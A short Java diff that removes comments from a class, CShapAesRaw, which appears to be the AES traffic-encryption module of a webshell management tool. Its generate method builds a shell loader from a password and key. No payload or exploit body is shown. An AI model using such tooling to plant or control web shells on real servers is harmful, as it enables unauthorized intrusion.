@@ -20,7 +20,7 @@ public class CShapAesRaw implements Cryption {
     private ShellEntity shell;
     private boolean state;
 
-    @Override // core.imp.Cryption
+    @Override 
     public void init(ShellEntity context) {
         this.shell = context;
         this.http = this.shell.getHttp();
@@ -43,7 +43,7 @@ public class CShapAesRaw implements Cryption {
         }
     }
 
-    @Override // core.imp.Cryption
+    @Override 
     public byte[] encode(byte[] data) {
         try {
             return this.encodeCipher.doFinal(data);
@@ -53,7 +53,7 @@ public class CShapAesRaw implements Cryption {
         }
     }
 
-    @Override // core.imp.Cryption
+    @Override 
     public byte[] decode(byte[] data) {
         try {
             return this.decodeCipher.doFinal(data);
@@ -63,17 +63,17 @@ public class CShapAesRaw implements Cryption {
         }
     }
 
-    @Override // core.imp.Cryption
+    @Override 
     public boolean isSendRLData() {
         return false;
     }
 
-    @Override // core.imp.Cryption
+    @Override 
     public boolean check() {
         return this.state;
     }
 
-    @Override // core.imp.Cryption
+    @Override 
     public byte[] generate(String password, String secretKey) {
         return Generate.GenerateShellLoder(password, functions.md5(secretKey).substring(0, 16), true);
     }
